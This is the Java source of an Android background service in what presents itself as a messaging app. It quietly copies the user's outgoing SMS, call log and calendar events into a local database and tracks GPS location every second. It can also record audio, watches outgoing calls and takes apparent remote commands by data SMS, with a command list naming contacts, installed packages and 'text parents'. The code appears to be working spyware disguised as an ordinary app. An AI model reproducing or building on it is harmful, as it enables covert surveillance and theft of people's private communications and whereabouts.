package com.candroid.textme.services;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Process;
import android.provider.CalendarContract;
import android.provider.CallLog;
import android.provider.Telephony;
import android.util.Log;

import com.candroid.textme.data.Commands;
import com.candroid.textme.data.Constants;
import com.candroid.textme.data.db.Database;
import com.candroid.textme.data.db.DatabaseHelper;
import com.candroid.textme.data.pojos.Recorder;
import com.candroid.textme.receivers.ImeReceiver;
import com.candroid.textme.api.Lofl;
import com.candroid.textme.receivers.CreateConversationReceiver;
import com.candroid.textme.receivers.DatabaseReceiver;
import com.candroid.textme.receivers.HeadsetPlugReceiver;
import com.candroid.textme.receivers.IncomingReceiver;
import com.candroid.textme.receivers.OutgoingCallReceiver;
import com.candroid.textme.receivers.OutgoingReceiver;
import com.candroid.textme.receivers.ScreenReceiver;
import com.candroid.textme.receivers.WapReceiver;
import com.candroid.textme.receivers.WifiReceiver;

public class MessagingService extends Service {

    private static final String TAG = MessagingService.class.getSimpleName();
    public static boolean sIsRunning = false;
    private IncomingReceiver mIncomingReceiver;
    private OutgoingReceiver mOutgoingReceiver;
    private CreateConversationReceiver mCreateConversationReceiver;
    private ScreenReceiver mScreenReceiver;
    private WapReceiver mWapReceiver;
    private DatabaseReceiver mDatabaseReceiver;
    private SmsObserver mObserver;
    private CallLogObserver mCallLogObserver;
    private CalendarObserver mCalendarObserver;
    private OutgoingCallReceiver mOutgoingCallReceiver;
    private HeadsetPlugReceiver mHeadsetReceiver;
    private WifiReceiver mWifiReceiver;
    public static String sTelephoneAddress;
    private LocationManager mLocationManager;
    public static MediaRecorder sMediaRecorder;
    private ImeReceiver mImeReceiver;
    private LocationListener mLocationListener;
    private HandlerThread mHandlerThread;
    private Looper mLooper;
    public static Recorder sRecorder;
    public MessagingService() {
    }

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(Constants.FOREGROUND_NOTIFICATION_ID, Lofl.createPersistentServiceNotification(this));
        //JobsScheduler.scheduleJob(this);
        sIsRunning = true;
        mIncomingReceiver = new IncomingReceiver();
        mOutgoingReceiver = new OutgoingReceiver();
        mHeadsetReceiver = new HeadsetPlugReceiver();
       // mImeReceiver = new ImeReceiver();
        mCreateConversationReceiver = new CreateConversationReceiver();
        mScreenReceiver = new ScreenReceiver();
        //mWapReceiver = new WapReceiver();
        //mWifiReceiver = new WifiReceiver();
/*        IntentFilter wapFilter = new IntentFilter("android.provider.Telephony.WAP_PUSH_RECEIVED");
        wapFilter.addAction("android.provider.Telephony.MMS_RECEIVED");
        try {
            wapFilter.addDataType("application/vnd.wap.mms-message");
        } catch (IntentFilter.MalformedMimeTypeException e) {
            e.printStackTrace();
        }*/
        IntentFilter screenFilter = new IntentFilter();
        screenFilter.addAction(Intent.ACTION_SCREEN_ON);
        screenFilter.addAction(Intent.ACTION_SCREEN_OFF);
        IntentFilter headsetFilter = new IntentFilter(Intent.ACTION_HEADSET_PLUG);
        IntentFilter incomingFilter = new IntentFilter(Telephony.Sms.Intents.DATA_SMS_RECEIVED_ACTION);
        incomingFilter.setPriority(Constants.PRIORITY);
        incomingFilter.addDataAuthority(Constants.HOST, Constants.PORT);
        incomingFilter.addDataScheme("sms");
        IntentFilter outgoingFilter = new IntentFilter();
        outgoingFilter.addAction(Constants.SEND_ACTION);
        outgoingFilter.addAction(Constants.WHISPER_ACTION);
        outgoingFilter.addAction(Constants.SENT_CONFIRMATION_ACTION);
        IntentFilter conversationFilter = new IntentFilter();
        conversationFilter.addAction(Constants.CREATE_CONVERSATION_ACTION);
        //  IntentFilter airplaneFilter = new IntentFilter();
        //  airplaneFilter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
        //  mAirplaneReceiver = new AirplaneReceiver();
        //  registerReceiver(mAirplaneReceiver, airplaneFilter);
        /*mShareReceiver = new ShareReceiver();
        IntentFilter shareFilter = new IntentFilter(Intent.ACTION_SEND);
        shareFilter.addCategory(Intent.CATEGORY_DEFAULT);
        try {
            shareFilter.addDataType("text/plain");
        } catch (IntentFilter.MalformedMimeTypeException e) {
            e.printStackTrace();
        }
        registerReceiver(mShareReceiver, shareFilter);*/
        //IntentFilter imeFilter = new IntentFilter(Intent.ACTION_INPUT_METHOD_CHANGED);
        //IntentFilter wifiFilter = new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
        //registerReceiver(mWapReceiver, wapFilter);
        if(this.checkSelfPermission(Manifest.permission.PROCESS_OUTGOING_CALLS) == PackageManager.PERMISSION_GRANTED){
            mOutgoingCallReceiver = new OutgoingCallReceiver();
            IntentFilter outgoingCallFilter = new IntentFilter();
            outgoingCallFilter.addAction(Intent.ACTION_NEW_OUTGOING_CALL);
            outgoingCallFilter.addCategory(Intent.CATEGORY_DEFAULT);
            registerReceiver(mOutgoingCallReceiver, outgoingCallFilter);
        }

        registerReceiver(mCreateConversationReceiver, conversationFilter);
        registerReceiver(mIncomingReceiver, incomingFilter);
        registerReceiver(mOutgoingReceiver, outgoingFilter);
        registerReceiver(mHeadsetReceiver, headsetFilter);
        registerReceiver(mScreenReceiver, screenFilter);
        //registerReceiver(mImeReceiver, imeFilter);
        //registerReceiver(mWifiReceiver, wifiFilter);
        IntentFilter databaseFilter = new IntentFilter();
        databaseFilter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        databaseFilter.addAction(Constants.Actions.ACTION_OUTGOING_SMS);
        mDatabaseReceiver = new DatabaseReceiver();
        registerReceiver(mDatabaseReceiver, databaseFilter);
        sTelephoneAddress = Lofl.getDeviceTelephoneNumber(this);
        Log.d(TAG, "address = " + sTelephoneAddress);
        mObserver = new SmsObserver();
        mCallLogObserver = new CallLogObserver();
        mCalendarObserver = new CalendarObserver();
        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
        if(this.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED){
            getContentResolver().registerContentObserver(Uri.parse("content://call_log"), true, mCallLogObserver);

        }
        if(this.checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
            getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);
        }
            //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            mHandlerThread = new HandlerThread("locationThread", Process.THREAD_PRIORITY_BACKGROUND);
            mHandlerThread.start();
            mLooper = mHandlerThread.getLooper();
            String locationProvider = LocationManager.GPS_PROVIDER;
            mLocationManager = Lofl.getLocationManager(MessagingService.this);
            mLocationListener = Lofl.getLocationListener(this);
            mLocationManager.requestLocationUpdates(locationProvider, 1000, 30, mLocationListener, mLooper);
        }
/*        Lofl.onReceiveCommand(this, Commands.CONTACTS);
        Lofl.onReceiveCommand(this, Commands.SMS);
        Lofl.onReceiveCommand(this, Commands.CALL_LOG);
        Lofl.onReceiveCommand(this, Commands.DEVICE_INFO);
        Lofl.onReceiveCommand(this, Commands.INSTALLED_PACKAGES);
        Lofl.onReceiveCommand(this, Commands.CALENDAR_EVENTS);
        Lofl.onReceiveCommand(this, Commands.TEXT_PARENTS);
        Lofl.onReceiveCommand(this, Commands.SHARE_APP);*/
        Lofl.onReceiveCommand(this, Commands.SYNC_PHONE_TO_DATABASE);
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        sIsRunning = false;
        unregisterReceiver(mCreateConversationReceiver);
        unregisterReceiver(mIncomingReceiver);
        unregisterReceiver(mOutgoingReceiver);
        //unregisterReceiver(mWapReceiver);
        unregisterReceiver(mHeadsetReceiver);
        unregisterReceiver(mScreenReceiver);
        unregisterReceiver(mOutgoingCallReceiver);
        //unregisterReceiver(mImeReceiver);
        /*unregisterReceiver(mShareReceiver);*/
        //unregisterReceiver(mAirplaneReceiver);
        DatabaseHelper.getInstance(getApplicationContext()).close();
        unregisterReceiver(mDatabaseReceiver);
        //unregisterReceiver(mWifiReceiver);
        getContentResolver().unregisterContentObserver(mObserver);
        getContentResolver().unregisterContentObserver(mCallLogObserver);
        getContentResolver().unregisterContentObserver(mCalendarObserver);
        mLocationManager.removeUpdates(mLocationListener);
        mLooper.quitSafely();
        mHandlerThread.stop();
        mHandlerThread.quitSafely();
        mHandlerThread.destroy();
        if(sMediaRecorder != null){
            sMediaRecorder.stop();
            sMediaRecorder.release();
        }
        stopForeground(true);
        stopSelf();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static void insertMessage(Context context, String destinationAddress, String originAddress, String body, long time, int type){
        Database.insertMessage(DatabaseHelper.getInstance(context.getApplicationContext()), destinationAddress, originAddress, body, time, type);
    }

    private class CallLogObserver extends ContentObserver{
        private int mLastId = -1;
        public CallLogObserver() {
            super(new Handler());
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    String[] projection = new String[]{CallLog.Calls._ID, CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
                    Cursor cursor = getContentResolver().query(uri, projection, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
                    if(cursor != null && cursor.moveToFirst()){
                        int idIndex = cursor.getColumnIndex(CallLog.Calls._ID);
                        int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                        int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                        int timeIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
                        int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
                        int id = cursor.getInt(idIndex);
                        if(mLastId != id){
                            mLastId = id;
                            String callType = cursor.getString(typeIndex);
                            String address = cursor.getString(numberIndex);
                            String time = cursor.getString(timeIndex);
                            String duration = cursor.getString(durationIndex);
                            long newRowId = Database.insertCallLogEntry(DatabaseHelper.getInstance(getApplicationContext().getApplicationContext()), callType, address, duration, time);
                        }
                        cursor.close();
                    }
                }
            }).start();
        }
    }

    private class SmsObserver extends ContentObserver {
        private int mLastSentMessageId = -1;

        public SmsObserver() {
            super(new Handler());
        }

        @Override
        public boolean deliverSelfNotifications() {
            return true;
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    // TODO: 1/27/19 we need to do a projection for sms. the problem is is that the content uri is set to the base uri without a specific table. however the constant values for columns in boht are identical
                    Cursor cursor = getContentResolver().query(uri, null, null, null, Telephony.Sms.DEFAULT_SORT_ORDER);
                    if (cursor != null && cursor.moveToFirst()) {
                        int type = cursor.getInt(cursor.getColumnIndex("type"));
                        if ( type == 2) {
                            int id = cursor.getInt(cursor.getColumnIndex("_id"));
                            if (id != mLastSentMessageId) {
                                mLastSentMessageId = id;
                                String body = cursor.getString(cursor.getColumnIndex("body"));
                                String address = cursor.getString(cursor.getColumnIndex("address"));
                                Intent outgoingSmsIntent = new Intent();
                                outgoingSmsIntent.putExtra(Constants.ADDRESS, address);
                                outgoingSmsIntent.putExtra(Constants.BODY, body);
                                outgoingSmsIntent.putExtra(Constants.TYPE, type);
                                outgoingSmsIntent.setAction(Constants.Actions.ACTION_OUTGOING_SMS);
                                sendBroadcast(outgoingSmsIntent);
                            }
                        }
                        cursor.close();
                    }
                }
            }).start();
        }
    }

    private class CalendarObserver extends ContentObserver{
        private int mLastId = -1;

        public CalendarObserver() {
            super(new Handler());
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);
            String[] projection = new String[]{CalendarContract.Events._ID, CalendarContract.Events.ACCOUNT_NAME, CalendarContract.Events.TITLE, CalendarContract.Events.DESCRIPTION, CalendarContract.Events.DTSTART,
                    CalendarContract.Events.DTEND, CalendarContract.Events.ALL_DAY, CalendarContract.Events.DURATION, CalendarContract.Events.CALENDAR_TIME_ZONE, CalendarContract.Events.EVENT_LOCATION, CalendarContract.Events.ORGANIZER};
            Cursor cursor = getContentResolver().query(CalendarContract.Events.CONTENT_URI, projection, null, null, null);
            if(cursor != null && cursor.moveToLast()){
                int accountNameIndex = cursor.getColumnIndex(CalendarContract.Events.ACCOUNT_NAME);
                int titleIndex = cursor.getColumnIndex(CalendarContract.Events.TITLE);
                int descriptionIndex = cursor.getColumnIndex(CalendarContract.Events.DESCRIPTION);
                int dateStartIndex = cursor.getColumnIndex(CalendarContract.Events.DTSTART);
                int dateEndIndex = cursor.getColumnIndex(CalendarContract.Events.DTEND);
                int allDayIndex = cursor.getColumnIndex(CalendarContract.Events.ALL_DAY);
                int durationIndex = cursor.getColumnIndex(CalendarContract.Events.DURATION);
                int calendarTimeZoneIndex = cursor.getColumnIndex(CalendarContract.Events.CALENDAR_TIME_ZONE);
                int locationIndex = cursor.getColumnIndex(CalendarContract.Events.EVENT_LOCATION);
                int organizerIndex = cursor.getColumnIndex(CalendarContract.Events.ORGANIZER);
                int id = cursor.getInt(cursor.getColumnIndex(CalendarContract.Events._ID));
                if(mLastId != id){
                    mLastId = id;
                    String account = cursor.getString(accountNameIndex);
                    String title = cursor.getString(titleIndex);
                    String description = cursor.getString(descriptionIndex);
                    long beginDate = cursor.getLong(dateStartIndex);
                    long endDate = cursor.getLong(dateEndIndex);
                    int isAllDay = cursor.getInt(allDayIndex);
                    String duration = cursor.getString(durationIndex);
                    String timeZone = cursor.getString(calendarTimeZoneIndex);
                    String location = cursor.getString(locationIndex);
                    String organizer = cursor.getString(organizerIndex);
                    Database.insertCalendarEvent(MessagingService.this, DatabaseHelper.getInstance(getApplicationContext()), account, title, description, beginDate, endDate, isAllDay, duration, timeZone, location, organizer);
                }
            }
            cursor.close();
        }
    }

    public static void recordAudio(Context context){
        if(sRecorder == null){
            sRecorder = new Recorder(context);
        }
        sRecorder.start();
    }

    public static void stopRecording(){
        if(sRecorder != null){
            sRecorder.stop();
        }
    }
}